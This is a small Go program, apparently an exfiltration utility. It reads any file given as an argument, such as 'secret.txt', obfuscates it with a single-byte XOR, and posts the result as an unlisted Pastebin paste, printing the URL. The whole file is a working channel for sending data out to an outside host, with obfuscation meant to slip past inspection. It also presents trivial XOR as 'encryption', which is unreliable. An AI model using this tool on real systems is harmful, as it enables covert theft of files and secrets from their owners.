package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
)

// Pastebin API setting
const (
	pastebinAPIURL   = "https://pastebin.com/api/api_post.php"
	pastebinAPIKey   = "<your api key>" // Pastebin API Key
	pastebinUserKey  = ""                     // option <login users key>
	pastebinPrivate  = "1"                    // 0=pub, 1=invisible, 2=private
	pastebinOption   = "paste"                // API option; paste
)

// XOR key
const xorKey = 0x55

// the function that to xor ancrypt
func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i, b := range data {
		encrypted[i] = b ^ xorKey
	}
	return encrypted
}

// post to Pastebin
func postToPastebin(content []byte) (string, error) {
	// POST request data
	data := url.Values{}
	data.Set("api_dev_key", pastebinAPIKey)
	data.Set("api_user_key", pastebinUserKey) 
	data.Set("api_option", pastebinOption)
	data.Set("api_paste_private", pastebinPrivate)
	data.Set("api_paste_code", string(content)) // send as string from encrypted data 

	// HTTP Request send
	resp, err := http.PostForm(pastebinAPIURL, data)
	if err != nil {
		return "", fmt.Errorf("failed to post to Pastebin: %v", err)
	}
	defer resp.Body.Close()

	// Response read
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read Pastebin response: %v", err)
	}

	
	// error check (pastebin will return 200 even error)
	response := string(body)
	if bytes.HasPrefix(body, []byte("Bad API request")) {
		return "", fmt.Errorf("Pastebin error: %s", response)
	}

	return response, nil // return URL then sccess
}

func main() {
	// argument check
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <filename>")
		fmt.Println("Example: go run main.go secret.txt")
		os.Exit(1)
	}

	filename := os.Args[1]

	// reading file
	data, err := os.ReadFile(filename)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading file %s: %v\n", filename, err)
		os.Exit(1)
	}

	// XOR encryption
	encryptedData := xorEncrypt(data)
	fmt.Printf("Encrypted %d bytes of data\n", len(encryptedData))

	// post Pastebin
	pasteURL, err := postToPastebin(encryptedData)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error posting to Pastebin: %v\n", err)
		os.Exit(1)
	}

	// success message
	fmt.Printf("File successfully encrypted and posted to Pastebin!\n")
	fmt.Printf("Pastebin URL: %s\n", pasteURL)
}
